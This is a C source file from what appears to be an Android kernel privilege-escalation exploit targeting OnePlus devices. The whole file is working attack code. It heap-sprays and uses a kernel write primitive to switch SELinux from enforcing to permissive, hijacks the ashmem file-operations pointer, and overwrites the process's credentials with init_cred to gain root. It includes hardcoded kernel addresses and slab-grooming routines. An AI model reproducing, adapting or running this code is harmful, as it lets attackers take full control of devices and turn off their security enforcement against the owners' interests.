/* selinux.c — Write 1 / Write 2 流程
 *
 * Write 1 (run_write1_selinux): 用 custom write 把 SELinux enforcing
 *   字节清零，进入 permissive。
 * Write 2 (run_write2_cred): 覆写 current->cred = init_cred 拿 root。
 *
 * do_custom_write / slab_drain 是这两个流程的共享辅助。所有入口对
 * main.c (run_exploit) 暴露：selinux_is_off / run_write1_selinux /
 * run_write2_cred 在 common.h 声明。
 *
 * run_write2_cred 调 direct_write.c 的 direct_read_shape0_exact64_once
 * 做 entry_task fallback 读取，调 route.c 的 run_main_route_threads
 * 触发 PI write。 */
#include "unplus.h"

/* Force slab page recycling by forking many short-lived processes.
 * Critical between Write 1 and Write 2 — FOPS page preparation
 * fragments the slab and can panic on subsequent heap sprays. */
static void slab_drain(void) {
  struct timespec up;
  clock_gettime(CLOCK_BOOTTIME, &up);
  int waves = (up.tv_sec > 60) ? 5 : 2;
  int batch = (up.tv_sec > 60) ? 400 : 200;
  for (int wave = 0; wave < waves; wave++) {
    pid_t *drain = calloc((size_t)batch, sizeof(pid_t));
    int n = 0;
    for (int i = 0; i < batch; i++) {
      drain[i] = fork();
      if (drain[i] == 0) { pause(); _exit(0); }
      if (drain[i] > 0) n++;
    }
    for (int i = 0; i < n; i++) {
      kill(drain[i], SIGKILL);
      waitpid(drain[i], NULL, 0);
    }
    free(drain);
    sched_yield();
  }
}

/* ── ghostlock-oneplus custom write (child-node PI rb_erase) ──
 *
 * Uses run_main_route_threads() + PAGE_PAYLOAD_FOPS to trigger the PI write.
 * Unlike the NebuSec path, this does NOT need open(/dev/ashmem).
 *
 * mode=1 (Write 1): writes page+0x100 to target → byte0=0x00 (selinux off)
 * mode=2 (Write 2): writes data_addr(INIT_CRED) to target (cred overwrite)
 */
static int do_custom_write(uintptr_t target, uintptr_t value, int mode, const char *desc) {
  pr_info("=== %s === target=0x%016zx mode=%d value=0x%016zx\n", desc, target, mode, value);
  set_pselect_write_mode(target, value, mode);

  pr_info("  heap spray start (FOPS mode)\n");
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  if (!page_base || !fake_lock || !fake_task) {
    pr_error("  heap spray failed base=%016zx lock=%016zx task=%016zx\n",
             page_base, fake_lock, fake_task);
    clear_pselect_write();
    return 0;
  }
  pr_info("  heap spray done base=%016zx lock=%016zx task=%016zx "
          "fops=%016zx\n",
          page_base, fake_lock, fake_task, fake_fops);

  run_main_route_threads();

  clear_pselect_write();
  return 1;
}

/* Check if SELinux is permissive via /sys/fs/selinux/enforce */
int selinux_is_off(void) {
  char val[16];
  read_first_line("/sys/fs/selinux/enforce", val, sizeof(val));
  return val[0] == '0';
}

/* Write 1: disable SELinux. Retries up to max_attempts times. */
int run_write1_selinux(int max_attempts) {
  if (selinux_is_off()) {
    pr_success("SELinux already off\n");
    return 1;
  }

  uintptr_t target = TARGET_DATA_SELINUX;
  for (int att = 1; att <= max_attempts; att++) {
    pr_info("Write 1 attempt %d/%d target=0x%016zx\n", att, max_attempts, target);
    if (!do_custom_write(target, 0, 1, "W1:SELinux")) {
      pr_warning("Write 1 attempt %d failed (heap spray)\n", att);
      continue;
    }
    usleep(100000);
    if (selinux_is_off()) {
      pr_success("★★★ SELinux DISABLED after attempt %d ★★★\n", att);
      return 1;
    }
    pr_warning("Write 1 attempt %d: SELinux still enforcing\n", att);
  }
  return 0;
}

/* W1-ashmem: overwrite ashmem_misc.fops with fake_fops pointer.
 * Same PI write primitive as W1 (do_custom_write), just a different target.
 * mode=3 → prepare_skb_payload sets fake_right = fake_fops (page-controlled
 * file_operations pointer). Target is the P0 alias of ashmem_misc+0x10.
 *
 * P0 verification: same PI write that flips SELinux (W1) writes a value here.
 * Success is confirmed by KPM readback (TARGET_DATA_ASHMEM_FOPS changed),
 * not by selinux_is_off — we don't touch enforcing.
 *
 * REQUIRES SELinux permissive: run W1 first (run_write1_selinux) before this. */
int run_write1_ashmem(int max_attempts) {
  uintptr_t target = TARGET_DATA_ASHMEM_FOPS;
  for (int att = 1; att <= max_attempts; att++) {
    pr_info("W1-ashmem attempt %d/%d target=0x%016zx\n", att, max_attempts, target);
    /* value=0 → prepare_skb_payload mode=3 auto-uses fake_fops */
    if (!do_custom_write(target, 0, 3, "W1:ashmem-fops")) {
      pr_warning("W1-ashmem attempt %d failed (heap spray)\n", att);
      continue;
    }
    pr_success("★★★ W1-ashmem: PI write done after attempt %d ★★★\n", att);
    pr_info("verify via KPM: safe_read8(0xffffff800222b568) should != original ashmem_fops\n");
    return 1;
  }
  return 0;
}

/* Write 2: overwrite cred with init_cred.
 * If pre_read_task is non-zero (read before Write 1 polluted the heap),
 * use it directly. Otherwise fall back to reading entry_task. */
int run_write2_cred(uint64_t pre_read_task) {
  uint64_t task = pre_read_task;

  if (!task || !is_direct_ptr((uintptr_t)task) || (task & 7) != 0) {
    /* Fallback: try to read entry_task now (may fail after Write 1) */
    int cpu = direct_root_cpu;
    if (cpu < 0) cpu = 0;
    uintptr_t pcpu_base = TARGET_PCPU_BASE_ADDR;
    uintptr_t unit_size = TARGET_PCPU_UNIT_SIZE;
    uintptr_t entry_slot = pcpu_base + (uintptr_t)cpu * unit_size + ENTRY_TASK_PERCPU_OFF;
    pr_info("Write 2: fallback entry_task read cpu=%d slot=0x%016zx\n", cpu, entry_slot);

    int write_idx = 0;
    for (int attempt = 1; attempt <= 10; attempt++) {
      int rr = direct_read_shape0_exact64_once(
          entry_slot, &task, "entry_task_w2", attempt, &write_idx);
      if (rr == DIRECT_R64_RETRY) continue;
      if (rr != DIRECT_R64_OK) break;
      if (task && is_direct_ptr((uintptr_t)task) && (task & 7) == 0) break;
      task = 0;
    }
  } else {
    pr_success("Write 2: using pre-read task @ 0x%016llx\n", (unsigned long long)task);
  }

  if (!task || !is_direct_ptr((uintptr_t)task)) {
    pr_error("Write 2: cannot read own task_struct\n");
    return 0;
  }
  pr_success("Write 2: own task @ 0x%016llx\n", (unsigned long long)task);

  uintptr_t cred_slot = (uintptr_t)task + TASK_CRED_OFF;
  uintptr_t init_cred_p0 = data_addr(INIT_CRED);
  for (int att = 1; att <= 5; att++) {
    if (att > 1) slab_drain();
    pr_info("Write 2 attempt %d/5 target=0x%016zx value=0x%016zx\n",
            att, cred_slot, init_cred_p0);
    if (!do_custom_write(cred_slot, init_cred_p0, 2, "W2:cred")) continue;
    usleep(50000);

    if (getuid() == 0) {
      pr_success("★★★ ROOT achieved after Write 2 attempt %d! uid=%u ★★★\n",
                 att, getuid());
      return 1;
    }
    pr_warning("Write 2 attempt %d: uid still %u\n", att, getuid());
  }
  return 0;
}
